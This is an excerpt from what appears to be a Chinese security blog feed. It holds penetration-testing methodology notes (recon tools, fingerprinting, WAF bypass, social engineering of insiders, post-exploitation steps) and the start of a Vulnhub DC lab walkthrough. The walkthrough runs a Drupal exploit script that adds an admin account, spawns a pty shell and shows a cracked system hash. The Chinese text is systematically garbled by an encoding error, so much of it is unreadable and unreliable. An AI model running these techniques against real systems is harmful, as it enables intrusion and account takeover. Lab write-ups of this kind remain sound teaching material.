alt="image-20230510222146978"></p></li></ul></li></ul><p>â€‹</p><ul><li><p>ç½‘ç«™</p><p><a href="https://ght.se7ensec.cn/#">åœ¨çº¿Google Hackingå°å·¥å…·</a></p><p><img src="/../images/image-20230509215656848-1685533751889.png" alt="image-20230509215656848"></p><p><a href="https://www.exploit-db.com/google-hacking-database">Google Hacking Database (GHDB) - Google Dorks, OSINT, Recon</a></p><p><img src="/../images/image-20230509151606375-1685533751889.png" alt="image-20230509151606375"></p></li></ul><h2 id="ç›®å½•-x2F-æ–‡ä»¶æ‰«æ"><a href="#ç›®å½•-x2F-æ–‡ä»¶æ‰«æ" class="headerlink" title="ç›®å½•&#x2F;æ–‡ä»¶æ‰«æ"></a>ç›®å½•&#x2F;æ–‡ä»¶æ‰«æ</h2><p><strong>å–å†³äºå­—å…¸ï¼Œéœ€è¦ç§¯ç´¯å­—å…¸</strong></p><ul><li><p>å·¥å…·</p><ul><li><p><a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffuf -c -w /path/to/wordlist -u https://target/FUZZ</span><br></pre></td></tr></table></figure><blockquote><p>åœ¨éœ€è¦æµ‹è¯•çš„åœ°æ–¹åŠ ä¸ŠFUZZ</p></blockquote></li><li><p><a href="https://github.com/lemonlove7/dirsearch_bypass403">https://github.com/lemonlove7/dirsearch_bypass403</a></p><blockquote><p>æµç¨‹ï¼šdirsearchè¿›è¡Œç›®å½•æ‰«æâ€”&gt;å°†æ‰€æœ‰403çŠ¶æ€çš„ç›®å½•è¿›è¡Œä¿å­˜â€“&gt;æ˜¯å¦è¿›è¡Œjsfindâ€“&gt;æ˜¯(è¿›è¡Œjsçˆ¬å–urlå’ŒåŸŸåï¼Œå°†çˆ¬å–åˆ°çš„urlè¿›è¡ŒçŠ¶æ€ç è¯†åˆ«å¦‚æœæ˜¯403çŠ¶æ€åˆ™è¿›è¡Œä¿å­˜)â€“&gt;è¿›è¡Œ403ç»•è¿‡ ï¼ˆä¸è¿‡jsfinderä¸å»ºè®®ä½¿ç”¨ï¼Œä¸å¦‚urlfinderå¥½ç”¨ï¼‰</p></blockquote></li><li><p><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a></p><blockquote><p><strong>BBScan</strong> æ˜¯ä¸€ä¸ªé«˜å¹¶å‘ã€è½»é‡çº§çš„ä¿¡æ¯æ³„éœ²æ‰«æå·¥å…·ã€‚</p></blockquote></li><li><p><a href="https://blog.csdn.net/qq_43427482/article/details/110008286">https://blog.csdn.net/qq_43427482/article/details/110008286</a></p><blockquote><p>æ•æ„Ÿæ–‡ä»¶</p></blockquote></li></ul></li><li><p>å­—å…¸</p><p>å°†å·¥å…·å†…ç½®å­—å…¸å’Œå…¬å¼€å­—å…¸è¿›è¡Œæ•´åˆï¼Œç„¶åè‡ªå·±åœ¨å®é™…ä¸­é‡åˆ°çš„å†æ·»åŠ ã€‚</p></li></ul><h2 id="JSä¿¡æ¯"><a href="#JSä¿¡æ¯" class="headerlink" title="JSä¿¡æ¯"></a>JSä¿¡æ¯</h2><p>å¯èƒ½æ³„éœ²æ¥å£ï¼Œåå°åœ°å€ï¼Œå¯†ç ç­‰æ•æ„Ÿä¿¡æ¯</p><h3 id="æŸ¥æ‰¾"><a href="#æŸ¥æ‰¾" class="headerlink" title="æŸ¥æ‰¾"></a>æŸ¥æ‰¾</h3><ul><li><p>å·¥å…·</p><p><code>Urlfinder</code>  ï¼ˆæ¨èï¼‰</p><p><code>JSfinder</code></p><p><a href="https://github.com/mickeystone/JSFinderPlus">https://github.com/mickeystone/JSFinderPlus</a></p></li><li><p>æµè§ˆå™¨æ’ä»¶</p><p>ç†ŠçŒ«å¤´â€“<code>FindSomething</code></p></li></ul><h3 id="webpack"><a href="#webpack" class="headerlink" title="webpack"></a>webpack</h3><p><a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a></p><h2 id="ä»£ç æ‰˜ç®¡å¹³å°"><a href="#ä»£ç æ‰˜ç®¡å¹³å°" class="headerlink" title="ä»£ç æ‰˜ç®¡å¹³å°"></a>ä»£ç æ‰˜ç®¡å¹³å°</h2><ul><li><p>github</p><p>å·¥å…·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/damit5/gitdorks_go</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./gitdorks_go_amd_linux -gd ../Dorks/smalldorks.txt -nws 20 -target gm7.org -tf ../tokenFile/tf.txt -ew 3</span><br></pre></td></tr></table></figure><blockquote><p><code>./tokenFile/tf.txt</code> â†’ <code>Github access token</code></p><p><code>../Dorks/smalldorks.txt</code> â†’  <code>å…³é”®å­—å­—å…¸</code></p></blockquote></li><li><p>GitLab: <a href="https://about.gitlab.com/">https://about.gitlab.com/</a></p></li><li><p>gitee: <a href="https://gitee.com/">https://gitee.com/</a></p></li></ul><h2 id="æ‹›è˜ä¿¡æ¯"><a href="#æ‹›è˜ä¿¡æ¯" class="headerlink" title="æ‹›è˜ä¿¡æ¯"></a>æ‹›è˜ä¿¡æ¯</h2><p>å¯ä»¥é€šè¿‡è¯¥å…¬å¸çš„æ‹›è˜å²—ä½ä¿¡æ¯ï¼Œåˆ†æå…¶æŠ€æœ¯æ ˆï¼Œå¾—åˆ°å¯¹æ–¹ç½‘ç«™çš„æ¶æ„ã€‚</p><h2 id="ç½‘ç›˜ä¿¡æ¯"><a href="#ç½‘ç›˜ä¿¡æ¯" class="headerlink" title="ç½‘ç›˜ä¿¡æ¯"></a>ç½‘ç›˜ä¿¡æ¯</h2><p>èšåˆç½‘ç«™ï¼š<a href="https://www.chaonengsou.com/">è¶…èƒ½æœ - ç™¾åº¦ç½‘ç›˜æœç´¢ç¥å™¨</a></p><h2 id="å†å²æ¼æ´"><a href="#å†å²æ¼æ´" class="headerlink" title="å†å²æ¼æ´"></a>å†å²æ¼æ´</h2><blockquote><p>ä»å„ç¬¬ä¸‰æ–¹å†å²æ¼æ´åº“ä¸­æŸ¥æ‰¾ç›®æ ‡æ›¾ç»æ³„éœ²çš„ å„ç§æ•æ„Ÿè´¦å·å¯†ç  [ å›½å†…ç›®æ ‡å¾ˆå¥½ä½¿ï¼Ÿ ]</p></blockquote><h2 id="æŠ€æœ¯æ–‡æ¡£-x2F-wiki-x2F-çŸ¥è¯†åº“"><a href="#æŠ€æœ¯æ–‡æ¡£-x2F-wiki-x2F-çŸ¥è¯†åº“" class="headerlink" title="æŠ€æœ¯æ–‡æ¡£ &#x2F; wiki &#x2F;çŸ¥è¯†åº“"></a>æŠ€æœ¯æ–‡æ¡£ &#x2F; wiki &#x2F;çŸ¥è¯†åº“</h2><p>ç›®æ ‡è‡ªå·±å¯¹å¤–æä¾›çš„å„ç§æ–‡æ¡£é‡Œæ³„éœ²çš„å„ç§è´¦å·å¯†ç åŠå…¶å®ƒæ•æ„Ÿä¿¡æ¯</p><ul><li><p>å®˜ç½‘</p></li><li><p><a href="https://www.yuque.com/dashboard">å·¥ä½œå° Â· è¯­é›€</a></p></li><li><p>ç™¾åº¦æ–‡åº“ï¼š<a href="https://wenku.baidu.com/">https://wenku.baidu.com</a></p><p>åŸåˆ›åŠ›æ–‡æ¡£ï¼š<a href="https://max.book118.com/">https://max.book118.com</a></p><p>å‡Œé£äº‘ï¼š<a href="https://wenku.lingfengyun.com/">https://wenku.lingfengyun.com</a></p></li></ul><h2 id="ç¤¾å·¥"><a href="#ç¤¾å·¥" class="headerlink" title="ç¤¾å·¥"></a>ç¤¾å·¥</h2><h3 id="æ‰“å…¥ç›®æ ‡å†…éƒ¨"><a href="#æ‰“å…¥ç›®æ ‡å†…éƒ¨" class="headerlink" title="æ‰“å…¥ç›®æ ‡å†…éƒ¨"></a>æ‰“å…¥ç›®æ ‡å†…éƒ¨</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŠ å…¥å†…éƒ¨QQç¾¤ / å¾®ä¿¡ç¾¤ / é’‰é’‰ç¾¤ ç­‰</span><br><span class="line">ç¤¾å·¥å†…éƒ¨äººå‘˜</span><br></pre></td></tr></table></figure><h3 id="ä¸ªäººä¿¡æ¯ä½¿ç”¨"><a href="#ä¸ªäººä¿¡æ¯ä½¿ç”¨" class="headerlink" title="ä¸ªäººä¿¡æ¯ä½¿ç”¨"></a>ä¸ªäººä¿¡æ¯ä½¿ç”¨</h3><ul><li><p>å°†å‰é¢æ”¶é›†åˆ°çš„å§“åï¼Œé‚®ç®±ï¼Œæ‰‹æœºå·ç­‰ä¸ªäººä¿¡æ¯æ”¾å…¥ç¤¾å·¥åº“æŸ¥è¯¢</p></li><li><p><a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></p><blockquote><p>é€šè¿‡æœç´¢å¼•æ“ã€PGPæœåŠ¡å™¨ä»¥åŠSHODANæ•°æ®åº“æ”¶é›†ç”¨æˆ·çš„emailï¼Œå­åŸŸåï¼Œä¸»æœºï¼Œé›‡å‘˜åï¼Œå¼€æ”¾ç«¯å£å’Œbannerä¿¡æ¯ã€‚</p></blockquote></li><li><p>ç”Ÿæˆç¤¾å·¥å­—å…¸ï¼Œè¿›è¡Œå£ä»¤çˆ†ç ´</p><p><a href="https://github.com/zgjx6/SocialEngineeringDictionaryGenerator">https://github.com/zgjx6/SocialEngineeringDictionaryGenerator</a></p></li></ul><h3 id="å·¥å…·-1"><a href="#å·¥å…·-1" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/n0tr00t/Sreg</span><br><span class="line">reg007</span><br></pre></td></tr></table></figure><h1 id="æŒ‡çº¹è¯†åˆ«"><a href="#æŒ‡çº¹è¯†åˆ«" class="headerlink" title="æŒ‡çº¹è¯†åˆ«"></a>æŒ‡çº¹è¯†åˆ«</h1><h2 id="ä¸ºä»€ä¹ˆ-2"><a href="#ä¸ºä»€ä¹ˆ-2" class="headerlink" title="ä¸ºä»€ä¹ˆ"></a>ä¸ºä»€ä¹ˆ</h2><ul><li><p><strong>ç­›é€‰å‡ºæœ€å¯èƒ½æœ‰æ¼æ´çš„ç‚¹</strong></p></li><li><p><strong>è¯†åˆ«waf</strong></p></li></ul><h2 id="æŒ‡çº¹è¯†åˆ«-1"><a href="#æŒ‡çº¹è¯†åˆ«-1" class="headerlink" title="æŒ‡çº¹è¯†åˆ«"></a>æŒ‡çº¹è¯†åˆ«</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><h3 id="Webåº”ç”¨æ¡†æ¶"><a href="#Webåº”ç”¨æ¡†æ¶" class="headerlink" title="Webåº”ç”¨æ¡†æ¶"></a>Webåº”ç”¨æ¡†æ¶</h3><h4 id="å·¥å…·-2"><a href="#å·¥å…·-2" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h4><ul><li><p><a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a></p><p><img src="/../images/image-20230511175807888-1685533751889.png" alt="image-20230511175807888"></p></li><li><p><a href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a> </p><p><img src="/../images/image-20230510175457574-1685533751889.png" alt="image-20230510175457574"></p></li><li><p><a href="https://github.com/broken5/bscan">https://github.com/broken5/bscan</a></p><p><img src="/../images/image-20230510175516456-1685533751889.png" alt="image-20230510175516456"></p></li><li><p><a href="https://github.com/EASY233/Finger">https://github.com/EASY233/Finger</a></p><p><img src="/../images/image-20230510175534390-1685533751889.png" alt="image-20230510175534390"></p></li><li><p><a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></p><p><img src="/../images/image-20230511110926338-1685533751889.png" alt="image-20230511110926338"></p></li></ul><h4 id="åœ¨çº¿ç½‘ç«™-1"><a href="#åœ¨çº¿ç½‘ç«™-1" class="headerlink" title="åœ¨çº¿ç½‘ç«™"></a>åœ¨çº¿ç½‘ç«™</h4><ul><li><p><a href="https://fp.shuziguanxing.com/#/">æŒ‡çº¹æ”¶å½•å¹³å°</a></p></li><li><p><a href="https://hackertarget.com/whatweb-scan/">https://hackertarget.com/whatweb-scan/</a></p></li><li><p><a href="http://www.yunsee.cn/">äº‘æ‚‰äº’è”ç½‘WEBèµ„äº§åœ¨çº¿æ¢³ç†|åœ¨çº¿CMSæŒ‡çº¹è¯†åˆ«å¹³å° - äº‘æ‚‰å®‰å…¨å¹³å°</a>ï¼ˆè¦ä¼ä¸šæ³¨å†Œï¼‰</p></li></ul><h4 id="æµè§ˆå™¨æ’ä»¶"><a href="#æµè§ˆå™¨æ’ä»¶" class="headerlink" title="æµè§ˆå™¨æ’ä»¶"></a>æµè§ˆå™¨æ’ä»¶</h4><p>Wappalyzer</p><h3 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h3><ul><li><p>æŸ¥çœ‹è¿”å›åŒ…æœ‰æ— WAFå­—æ ·</p><p><img src="/../images/image-20230511233014884-1685533751889.png" alt="image-20230511233014884"></p></li><li><p><a href="https://github.com/EnableSecurity/wafw00f">WAFW00F </a></p></li><li><p>æŸ¥çœ‹æ‹¦æˆªé¡µé¢ä¿¡æ¯</p><blockquote><p>é€šè¿‡ä¸€äº›æ˜æ˜¾çš„æ³¨å…¥æ¥è§¦å‘waf</p></blockquote><p><a href="https://cloud.tencent.com/developer/beta/article/1872310">83ä¸ªWafæ‹¦æˆªé¡µé¢-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘</a>  ï¼ˆ5å¹´å‰ï¼‰</p><p><a href="https://mp.weixin.qq.com/s/8F060FU9g_78z57UKS-JsQ">30å‡ æ¬¾å¸¸è§WAFçš„æ‹¦æˆªé¡µæ•´ç†</a>   ï¼ˆ2021å¹´ï¼‰</p></li></ul><h3 id="èœœç½"><a href="#èœœç½" class="headerlink" title="èœœç½"></a>èœœç½</h3><p><a href="https://github.com/cnrstar/anti-honeypot">https://github.com/cnrstar/anti-honeypot</a></p><p><a href="https://send-safe-honeypot-hunter.apponic.com/">https://send-safe-honeypot-hunter.apponic.com/</a></p><h1 id="æ¼æ´æ¢æµ‹ä¸åˆ©ç”¨"><a href="#æ¼æ´æ¢æµ‹ä¸åˆ©ç”¨" class="headerlink" title="æ¼æ´æ¢æµ‹ä¸åˆ©ç”¨"></a>æ¼æ´æ¢æµ‹ä¸åˆ©ç”¨</h1><h2 id="åŸºæœ¬æµç¨‹"><a href="#åŸºæœ¬æµç¨‹" class="headerlink" title="åŸºæœ¬æµç¨‹"></a>åŸºæœ¬æµç¨‹</h2><p>ç»è¿‡ä¿¡æ¯æ”¶é›†å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webæœåŠ¡ ï¼ˆæ¶æ„ï¼Œä¸­é—´ä»¶ï¼Œç›®å½•ç»“æ„ï¼‰</span><br><span class="line">ç«¯å£æœåŠ¡</span><br><span class="line">æ•æ„Ÿä¿¡æ¯ ï¼ˆæ•æ„Ÿæ–‡ä»¶ï¼Œç¤¾å·¥ä¿¡æ¯ï¼‰</span><br><span class="line">é‡ç‚¹æ”»å‡»å¯¹è±¡</span><br><span class="line">ç«™ç‚¹æ˜¯å¦å­˜åœ¨waf</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ¼æ‰«</span><br><span class="line">æ‰‹å·¥</span><br><span class="line">ç»•waf</span><br><span class="line">ä»£ç å®¡è®¡</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ†ç±»"><a href="#æ¼æ´åˆ†ç±»" class="headerlink" title="æ¼æ´åˆ†ç±»"></a>æ¼æ´åˆ†ç±»</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç³»ç»Ÿæ¼æ´ </span><br><span class="line">webæ¼æ´ </span><br><span class="line">ä¸­é—´ä»¶æ¼æ´ </span><br><span class="line">ç«¯å£æœåŠ¡æ¼æ´ </span><br><span class="line">ä¸šåŠ¡é€»è¾‘æ¼æ´</span><br><span class="line">é€šä¿¡å®‰å…¨</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‚ç…§æ¼æ´checklistæ¥è¿›è¡Œæ£€æµ‹ã€‚</p><p><strong>çº¢é˜Ÿï¼šé‡ç‚¹å…³æ³¨èƒ½<code>getshell</code>çš„æ¼æ´</strong></p><h2 id="wafç»•è¿‡"><a href="#wafç»•è¿‡" class="headerlink" title="wafç»•è¿‡"></a>wafç»•è¿‡</h2><p><a href="https://fgtbnc.github.io/2023/06/01/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/">wafç»•è¿‡å­¦ä¹  | Khaz</a></p><h1 id="å¾…åš"><a href="#å¾…åš" class="headerlink" title="å¾…åš"></a>å¾…åš</h1><blockquote><p>æŠŠä¸Šé¢çš„å‡ ä¸ªæ­¥éª¤ï¼Œå·¥å…·ä¸²èµ·æ¥ï¼Œè¡Œæˆå¿«é€Ÿä¿¡æ¯æ”¶é›†ï¼Œå¿«é€Ÿæ¢æµ‹æ‰“ç‚¹ï¼Œæœ€å¥½å†™ä¸ªè´¯ç©¿æµç¨‹çš„å·¥å…·è°ƒç”¨çš„è„šæœ¬ã€‚</p></blockquote><p>å‚è€ƒï¼š<a href="https://www.se7ensec.cn/2023/02/14/%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%9E%E7%8E%B0/">https://www.se7ensec.cn/2023/02/14/%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%9E%E7%8E%B0/</a></p><h1 id="åæ¸—é€"><a href="#åæ¸—é€" class="headerlink" title="åæ¸—é€"></a>åæ¸—é€</h1><p><img src="/../images/image-20230510184801834-1685533751889.png" alt="image-20230510184801834"></p><p>å®æ“è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŸŸä¿¡æ¯æ”¶é›†</span><br><span class="line">linuxææƒ</span><br><span class="line">ä»£ç†ç©¿é€ï¼ˆsocket5ï¼Œfrpï¼Œre_Georgeï¼Œproxiferï¼‰</span><br><span class="line">æ–‡ä»¶ä¼ è¾“</span><br><span class="line">ç®€å•å…æ€</span><br><span class="line">mimikatz</span><br><span class="line">ipc$ï¼ˆä½¿ç”¨ï¼Œæƒé™é—®é¢˜ï¼‰</span><br><span class="line">pthå“ˆå¸Œä¼ é€’</span><br><span class="line">msfä½¿ç”¨</span><br></pre></td></tr></table></figure><h2 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å†…ç½‘æœé›†/æ¢æµ‹ =&gt;  å…æ€ææƒ[éå¿…é¡»] =&gt; æŠ“å–ç™»å½•å‡­è¯ =&gt; ï¼ˆè·¨ï¼‰å¹³å°æ¨ªå‘ =&gt; å…¥å£ç»´æŒ =&gt; æ•°æ®å›ä¼  =&gt; å®šæœŸæƒé™ç»´æŠ¤</span><br></pre></td></tr></table></figure><p><a href="https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/">åŸŸæ¸—é€ä¸€æ¡é¾™æ‰‹å†Œ</a></p><h1 id="äº§å‡ºæŠ¥å‘Š"><a href="#äº§å‡ºæŠ¥å‘Š" class="headerlink" title="äº§å‡ºæŠ¥å‘Š"></a>äº§å‡ºæŠ¥å‘Š</h1><p><a href="https://www.anquanke.com/post/id/215031#h3-5">å¦‚ä½•ç¼–å†™ä¸€ä»½ä¸“ä¸šçš„æ¸—é€æµ‹è¯•æŠ¥å‘Š-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°</a></p><p><a href="https://github.com/awake1t/HackReport/tree/main/01-%E6%8A%A5%E5%91%8A%E6%A8%A1%E6%9D%BF">HackReport&#x2F;01-æŠ¥å‘Šæ¨¡æ¿ at main Â· awake1t&#x2F;HackReport</a></p><p><strong>ä¿®å¤å»ºè®®â€“æ¸—é€æµ‹è¯•ä¿®å¤å»ºè®®æ€»ç»“.pdf</strong></p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://blog.gm7.org/">Introduction </a></p><p><a href="https://gitbook.se7ensec.cn/#duan-kou-sao-miao">åœ¨çº¿å·¥å…· - è‚¾é€æµ‹è¯•ä¸­å¿ƒ</a></p><p><a href="https://gitbook.se7ensec.cn/hong-dui-zuo-zhan-shou-ce#liu-cheng-jian-yao-shuo-ming">çº¢é˜Ÿä½œæˆ˜æ‰‹å†Œ - è‚¾é€æµ‹è¯•ä¸­å¿ƒ</a></p><p><a href="https://github.com/bin-maker/BYPASS-CDN/">https://github.com/bin-maker/BYPASS-CDN/</a></p><p><a href="https://www.secpulse.com/archives/194410.html">https://www.secpulse.com/archives/194410.html</a></p><p><a href="https://wiki.wgpsec.org/knowledge/">ç‹¼ç»„å®‰å…¨å›¢é˜Ÿå…¬å¼€çŸ¥è¯†åº“</a></p><p><a href="https://www.wangan.com/p/7fy7fy135d85fec8">https://www.wangan.com/p/7fy7fy135d85fec8</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub--DCç³»åˆ—</title>
      <link href="/2023/06/01/Vulnhub-DC%E7%B3%BB%E5%88%97/"/>
      <url>/2023/06/01/Vulnhub-DC%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h2 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h2><h4 id="ä¸»æœºå‘ç°"><a href="#ä¸»æœºå‘ç°" class="headerlink" title="ä¸»æœºå‘ç°"></a>ä¸»æœºå‘ç°</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo netdiscover 192.168.174.0/24</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230223133100570-1686283446321.png" alt="image-20230223133100570"></p><p><img src="/../images/image-20230223133203500-1686283446321.png" alt="image-20230223133203500"></p><h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p><img src="/../images/image-20230223131655833-1686283446321.png" alt="image-20230223131655833"></p><h4 id="æŸ¥çœ‹ç½‘ç«™"><a href="#æŸ¥çœ‹ç½‘ç«™" class="headerlink" title="æŸ¥çœ‹ç½‘ç«™"></a>æŸ¥çœ‹ç½‘ç«™</h4><p><img src="/../images/image-20230223133357605-1686283446321.png" alt="image-20230223133357605"></p><p>åªæœ‰æ³¨å†Œï¼Œç™»å½•ï¼Œæ‰¾å›å¯†ç åŠŸèƒ½ï¼ˆè¿™é‡Œç”¨sqlmapæ²¡æœ‰æˆåŠŸï¼‰</p><p>å¾ˆå®¹æ˜“çŸ¥é“å…¶æ˜¯Drupalç³»ç»Ÿã€‚</p><h4 id="å¯»æ‰¾æ¼æ´"><a href="#å¯»æ‰¾æ¼æ´" class="headerlink" title="å¯»æ‰¾æ¼æ´"></a>å¯»æ‰¾æ¼æ´</h4><p><img src="/../images/image-20230223133730288-1686283446321.png" alt="image-20230223133730288"></p><p>è¿™é‡Œä¼˜å…ˆä½¿ç”¨æ—¥æœŸè¾ƒæ–°ï¼Œç­‰çº§ä¸ºä¼˜ç§€çš„expï¼ˆä¹Ÿå¯ä»¥é€šè¿‡æ”¶é›†åˆ°çš„ç³»ç»Ÿç‰ˆæœ¬å¯»æ‰¾æ—¥æœŸï¼‰</p><p><img src="/../images/image-20230223133945118-1686283446321.png" alt="image-20230223133945118"></p><p>å‘ç°æˆåŠŸäº†ã€‚</p><h4 id="è·å¾—shellåçš„ä¿¡æ¯æ”¶é›†"><a href="#è·å¾—shellåçš„ä¿¡æ¯æ”¶é›†" class="headerlink" title="è·å¾—shellåçš„ä¿¡æ¯æ”¶é›†"></a>è·å¾—shellåçš„ä¿¡æ¯æ”¶é›†</h4><p><img src="/../images/image-20230223134100934-1686283446322.png" alt="image-20230223134100934"></p><p>ç½‘ä¸ŠæŸ¥æ‰¾å¯çŸ¥Drupalçš„é…ç½®æ–‡ä»¶åœ¨<code> /sites/default/settings.php</code>,è¯»å–åå¾—åˆ°flag2å’Œæ•°æ®åº“é…ç½®ä¿¡æ¯</p><p><img src="/../images/1962254-20200713224317160-859515027-1686283446322.png" alt="img"></p><p>è¿æ¥æ•°æ®åº“ï¼Œéœ€è¦å…ˆå°†shellåˆ‡æ¢ä¸ºäº¤äº’å¼</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230223134424820-1686283446322.png" alt="image-20230223134424820"></p><p>è¿æ¥åï¼ŒæŸ¥è¯¢ç”¨æˆ·è¡¨æ”¶é›†ç®¡ç†å‘˜è´¦æˆ·ä¿¡æ¯ã€‚</p><p><img src="/../images/image-20230223130117676-1686283446322.png" alt="image-20230223130117676"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œadminçš„å¯†ç æ˜¯åŠ å¯†äº†çš„ã€‚è¿™é‡Œæœ‰ä¸‰ç§æ€è·¯</p><ul><li><p>æš´åŠ›ç ´è§£</p><blockquote><p>ä½¿ç”¨johnå¤±è´¥äº†ã€‚</p></blockquote><p><img src="/../images/image-20230223135625792-1686283446323.png" alt="image-20230223135625792"></p></li><li><p>ä¿®æ”¹å¯†ç </p><blockquote><p>éœ€è¦æ‰¾åˆ°å¯¹åº”çš„åŠ å¯†è„šæœ¬ã€‚</p></blockquote><p><img src="/../images/image-20230223135430041-1686283446323.png" alt="image-20230223135430041"></p><p><img src="/../images/image-20230223130607081-1686283446323.png" alt="image-20230223130607081"></p><p><img src="/../images/image-20230223131033472-1686283446323.png" alt="image-20230223131033472"></p></li><li><p>å¢åŠ ä¸€åç”¨æˆ·ï¼ˆç®¡ç†å‘˜æƒé™ï¼‰</p><p>ä½¿ç”¨<a href="https://blog.csdn.net/whatday/article/details/102806149">SearchSploit</a>æŸ¥æ‰¾æ˜¯å¦æœ‰å¯¹åº”çš„è„šæœ¬</p><p><img src="/../images/image-20230223142047059-1686283446323.png" alt="image-20230223142047059"></p><p><img src="/../images/image-20230223142453365-1686283446323.png" alt="image-20230223142453365"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python2  /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.174.142/ -u admin1 -p 12345</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230223142640254-1686283446323.png" alt="image-20230223142640254"></p><p><img src="/../images/image-20230223142651974-1686283446323.png" alt="image-20230223142651974"></p></li></ul><h3 id="ç™»å½•å"><a href="#ç™»å½•å" class="headerlink" title="ç™»å½•å"></a>ç™»å½•å</h3><p><img src="/../images/image-20230223131339443-1686283446323.png" alt="image-20230223131339443"></p><p><img src="/../images/image-20230223131415615-1686283446323.png" alt="image-20230223131415615"></p><p><img src="/../images/image-20230223131557531-1686283446323.png" alt="image-20230223131557531"></p><p><img src="/../images/image-20230223131846299-1686283446324.png" alt="image-20230223131846299"></p><p>å°è¯•ææƒ</p><p><img src="/../images/image-20230223131936343-1686283446324.png" alt="image-20230223131936343"></p><p><img src="/../images/image-20230223131903800-1686283446324.png" alt="image-20230223131903800"></p><p><img src="/../images/image-20230223131922331-1686283446324.png" alt="image-20230223131922331"></p><p><img src="/../images/image-20230223132056437-1686283446324.png" alt="image-20230223132056437"></p><p><img src="/../images/image-20230223132116100-1686283446324.png" alt="image-20230223132116100"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230223132610089-1686283446324.png" alt="image-20230223132610089"></p><p>ç ´è§£æˆåŠŸåç™»å½•flag4ç”¨æˆ·</p><p><img src="/../images/image-20230223132741851-1686283446324.png" alt="image-20230223132741851"></p><p><img src="/../images/image-20230223132857455-1686283446324.png" alt="image-20230223132857455"></p><p>ä»ç„¶ä½¿ç”¨ä¸Šé¢çš„findææƒ</p><p><img src="/../images/image-20230223132915683-1686283446324.png" alt="image-20230223132915683"></p><h2 id="DC2"><a href="#DC2" class="headerlink" title="DC2"></a>DC2</h2><p><a href="https://cloud.tencent.com/developer/article/1801074">https://cloud.tencent.com/developer/article/1801074</a></p><ul><li>ipé‡å®šå‘ï¼Œéœ€è¦æ·»åŠ hostè®°å½•</li><li>cewlå¯†ç å­—å…¸ç”Ÿæˆï¼Œå¯†ç çˆ†ç ´</li><li>7744ç«¯å£çš„sshçˆ†ç ´</li><li>rbashé™åˆ¶</li><li>gitææƒ</li></ul><h2 id="DC3"><a href="#DC3" class="headerlink" title="DC3"></a>DC3</h2><p><a 